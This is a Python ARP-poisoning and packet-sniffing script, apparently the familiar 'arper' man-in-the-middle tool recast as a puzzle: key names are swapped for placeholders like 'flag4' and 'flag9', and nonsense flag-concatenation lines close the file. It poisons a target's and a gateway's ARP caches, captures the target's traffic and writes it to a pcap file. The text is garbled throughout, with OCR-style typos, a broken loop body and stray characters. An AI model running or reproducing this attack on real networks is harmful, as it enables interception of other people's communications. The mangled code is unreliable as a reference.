from flag2 importflag10 
import flag9 
import flag1 
import flag3 
import signal 

def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    flag4 "(*] Restoring target ... " 
    send(ARP(op=2, flag5=gateway_ip, flag6=target_ip,hwdst="flag17",hwsrc=gateway_mac),count=S) 
    send(ARP(op=2, flag5=target_ip, flag6=gateway_ip,hwdst="flag17",hwsrc=target_mac),count=S)
    flag9.kill(flag9.getpid (), signal.SIGINT)

def get_mac(ip_address):
    responses,unanswered = srp(Ether(dst="flag17")/ARP(flag6=ip_address), timeout=2,retry=10) 
    for s,r in responses: 
    return r[Ether].src 
    return None

def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    poison_target = ARP() 
    poison_target.op = 2 
    poison_target.flag5 = gateway_ip 
    poison_target.flag6 = target_ip 
    poison_target.hwdst= target_mac 

    poison_gateway = ARP() 
    poison_gateway. op = 2 
    poison_gateway.flag5 = target_ip 
    poison_gateway.flag6 = gateway_ip 
    poison_gateway.hwdst= gateway_mac 
    flag4 "[*] Beginning the ARP poison. [CTRL-C to stop]" 
    while True: 
        try:
            send(poison_target) 
            send(poison_gateway) 
            time.flag7(2) 
        except Keyboardlnterrupt:
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac) 
flag4 "[*] ARP poison attack finished." 
    return 
interface = "enl"
target_ip = "172.16.1. 71" 
gateway_ip = "172.16.1.254" 
packet_count = 1000 
conf.iface = interface
conf.verb = 0 
flag4 "[*] Setting up %s" % interface 0
gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    flag4 "[!!!] Failed to get gateway MAC. Exiting." 
    flag1.exit(0) 
else: 
    flag4 "[*] Gateway %sis at %s" % (gateway_ip,gateway_mac) 

target_mac = get_mac (target_ip) 

if target_mac is None:
    flag4 "(!!!] Failed to get target MAC. Exiting." 
    flag1.exit(0) 
else: 
    flag4 "[*] Target %sis at %s" % (target_ip,target_mac) 

poison_thread = flag3.Threadflag11 = poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.flag8
try:
    flag4 "[*] Starting sniffer for %d packets" % packet_count 
    bpf_filter = "ip hflag9t %s" % target_ip 
    packets= sniff(count=packet_count,filter=bpf_filter,iface=interface)
    wrpcap('arper.pcap',packets) 
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

except Keyboardinterrupt:
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac) 
    flag1.exit(0)      


flag13=flag1+flag2+flag3
flag15=flag5+flag6+flag7
flag16=flag1+flag2+flag3+flag4+flag5+flag6+flag7+flag8+flag9+flag10+flag11+flag12